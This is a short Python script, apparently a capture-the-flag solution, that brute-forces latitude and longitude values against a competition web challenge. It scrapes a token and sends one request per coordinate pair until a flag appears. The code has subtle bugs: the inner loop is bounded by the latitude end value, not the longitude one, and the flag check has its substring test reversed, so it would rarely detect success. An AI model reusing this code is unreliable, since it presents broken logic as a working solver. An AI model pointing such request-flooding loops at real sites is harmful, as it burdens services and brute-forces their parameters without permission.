import sys
import requests
from bs4 import BeautifulSoup
import numpy

class BruteForce:
    def __init__(self,lat_start,lat_end,lon_start,lon_end):
        self.lat_start=round(float(lat_start),4)
        self.lat_end=round(float(lat_end),4)
        self.lon_start=round(float(lon_start),4)
        self.lon_end=round(float(lon_end),4)
        self.InitingBruteForce()

    def InitingBruteForce(self):
        self.token=' '
        req=requests.get('https://drivetothetarget.web.ctfcompetition.com')
        html_txt=req.text
        soup=BeautifulSoup(html_txt,'html.parser')
        self.token=soup.find('input',{'name': 'token'}).get('value')
        
    def BruteForcing(self):
        for lat in numpy.arange(self.lat_start,
                self.lat_end,0.0001):
            for lon in numpy.arange(self.lon_start,
                    self.lat_end,0.0001):
                req=requests.get('https://drivetothetarget.web.ctfcompetition.com/?lat='+str(lat)+'&lon='+str(lon)+'&token='+self.token)
                html_txt=req.text
                soup=BeautifulSoup(html_txt,'html.parser')
                msg=str(soup.find_all('p')[-1].get_text())

                if msg in 'ctf' or msg in 'flag':
                    print(msg)
                    return 1
                self.token=soup.find('input',{'name': 'token'}).get('value')
        return 0


if __name__ == "__main__":
    if len(sys.argv) !=5:
        print("Plaese use 4 argument")
        sys.exit(-1)

    brute_force=BruteForce(sys.argv[1],sys.argv[2],sys.argv[3],
            sys.argv[4])
    if brute_force.BruteForcing():
        print("Brute Force Success.")
    else:
        print("Brute Force Failed.")



        
